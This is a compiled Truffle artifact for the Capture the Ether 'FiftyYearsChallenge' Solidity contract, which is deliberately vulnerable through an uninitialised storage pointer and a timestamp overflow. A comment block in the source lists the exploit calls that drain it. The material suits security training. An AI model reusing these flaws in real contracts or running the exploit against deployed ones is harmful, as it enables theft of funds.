{
  "contractName": "FiftyYearsChallenge",
  "abi": [
    {
      "inputs": [
        {
          "name": "player",
          "type": "address"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "index",
          "type": "uint256"
        },
        {
          "name": "timestamp",
          "type": "uint256"
        }
      ],
      "name": "upsert",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "index",
          "type": "uint256"
        }
      ],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405260405160208061055983398101604052808051906020019091905050670de0b6b3a76400003414151561003657600080fd5b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000805480600101828161008b91906100d8565b916000526020600020906002020160006040805190810160405280348152602001635dfc0f0042018152509091909150600082015181600001556020820151816001015550505050610139565b81548183558181151161010557600202816002028360005260206000209182019101610104919061010a565b5b505050565b61013691905b8082111561013257600080820160009055600182016000905550600201610110565b5090565b90565b610411806101486000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632e1a7d4d1461005c5780633b8f718a1461007f578063b2fa1c9e146100a0575b600080fd5b341561006757600080fd5b61007d60048080359060200190919050506100cd565b005b61009e600480803590602001909190803590602001909190505061021f565b005b34156100ab57600080fd5b6100b3610363565b604051808215151515815260200191505060405180910390f35b600080600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561012c57600080fd5b60008381548110151561013b57fe5b906000526020600020906002020160010154421015151561015b57600080fd5b6000915060015490505b82811115156101d05760008181548110151561017d57fe5b906000526020600020906002020160000154820191506000818154811015156101a257fe5b9060005260206000209060020201600080820160009055600182016000905550508080600101915050610165565b600183016001819055503373ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050151561021a57600080fd5b505050565b6000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561027d57600080fd5b6001548310158015610293575060008054905083105b156102ce576000838154811015156102a757fe5b9060005260206000209060020201905034816000016000828254019250508190555061035e565b6201518060006001600080549050038154811015156102e957fe5b90600052602060002090600202016001015401821015151561030a57600080fd5b348160000181905550818160010181905550600080548060010182816103309190610384565b9160005260206000209060020201600083909190915060008201548160000155600182015481600101555050505b505050565b6000803073ffffffffffffffffffffffffffffffffffffffff163114905090565b8154818355818115116103b1576002028160020283600052602060002091820191016103b091906103b6565b5b505050565b6103e291905b808211156103de576000808201600090556001820160009055506002016103bc565b5090565b905600a165627a7a72305820721451438853172676c54fddef5664f1c69d51ac0ef7e0d30ef2b0af98410a750029",
  "source": "pragma solidity ^0.4.21;\r\n\r\n/*\r\nconst { BigNumber } = require('ethers')\r\nvar fiftyYearsChallenge = await FiftyYearsChallenge.deployed()\r\n// length\r\nawait web3.eth.getStorageAt(fiftyYearsChallenge.address, 0);\r\n\r\n// timestamp\r\nawait web3.eth.getStorageAt(fiftyYearsChallenge.address, 1);\r\n\r\n// owner==index 2\r\nawait web3.eth.getStorageAt(fiftyYearsChallenge.address, 2);\r\nawait web3.eth.getStorageAt(fiftyYearsChallenge.address, 3);\r\nawait web3.eth.getStorageAt(fiftyYearsChallenge.address, 4);\r\n\r\nconst ONE_DAYS_IN_SECONDS = 24 * 60 * 60\r\nconst DATE_OVERFLOW = BigNumber.from(`2`).pow(`256`).sub(ONE_DAYS_IN_SECONDS)\r\nawait fiftyYearsChallenge.upsert(`1`, DATE_OVERFLOW.toString(), { value: `1`, })\r\nawait fiftyYearsChallenge.upsert(`2`, '0', { value: `2`, })\r\n\r\nvar queue0 = await fiftyYearsChallenge.getQueue(`0`)\r\nvar queue1 = await fiftyYearsChallenge.getQueue(`1`)\r\nvar queue2 = await fiftyYearsChallenge.getQueue(`2`)\r\n\r\nawait deployer.deploy(RetirementFundAttacker, fiftyYearsChallenge.address, { from: accounts[0], value: \"2\" });\r\n\r\nweb3.eth.getBalance(fiftyYearsChallenge.address)\r\nawait fiftyYearsChallenge.withdraw(`2`)\r\n\r\nweb3.eth.getBalance('0x999FDa97f87E1A8e14d24b105a6b9E582c9eC0A3')\r\n\r\n*/\r\n\r\ncontract FiftyYearsChallenge {\r\n    struct Contribution {\r\n        uint256 amount;\r\n        uint256 unlockTimestamp;\r\n    }\r\n    Contribution[] queue;\r\n    uint256 head;\r\n\r\n    address owner;\r\n    function FiftyYearsChallenge(address player) public payable {\r\n        require(msg.value == 1 ether);\r\n\r\n        owner = player;\r\n        queue.push(Contribution(msg.value, now + 50 years));\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function upsert(uint256 index, uint256 timestamp) public payable {\r\n        require(msg.sender == owner);\r\n\r\n        if (index >= head && index < queue.length) {\r\n            // Update existing contribution amount without updating timestamp.\r\n            Contribution storage contribution = queue[index];\r\n            contribution.amount += msg.value;\r\n        } else {\r\n            // Append a new contribution. Require that each contribution unlock\r\n            // at least 1 day after the previous one.\r\n            require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);\r\n\r\n            contribution.amount = msg.value;\r\n            contribution.unlockTimestamp = timestamp;\r\n            queue.push(contribution);\r\n        }\r\n    }\r\n\r\n    // function getQueue(uint256 index) public view returns (uint256 amount, uint256 unlockTimestamp) {\r\n    //     amount = queue[index].amount;\r\n    //     unlockTimestamp = queue[index].unlockTimestamp;\r\n    //     return;\r\n    // }\r\n\r\n    function withdraw(uint256 index) public {\r\n        require(msg.sender == owner);\r\n        require(now >= queue[index].unlockTimestamp);\r\n\r\n        // Withdraw this and any earlier contributions.\r\n        uint256 total = 0;\r\n        for (uint256 i = head; i <= index; i++) {\r\n            total += queue[i].amount;\r\n\r\n            // Reclaim storage.\r\n            delete queue[i];\r\n        }\r\n\r\n        // Move the head of the queue forward so we don't have to loop over\r\n        // already-withdrawn contributions.\r\n        head = index + 1;\r\n\r\n        msg.sender.transfer(total);\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\FiftyYearsChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-13T00:40:33.287Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}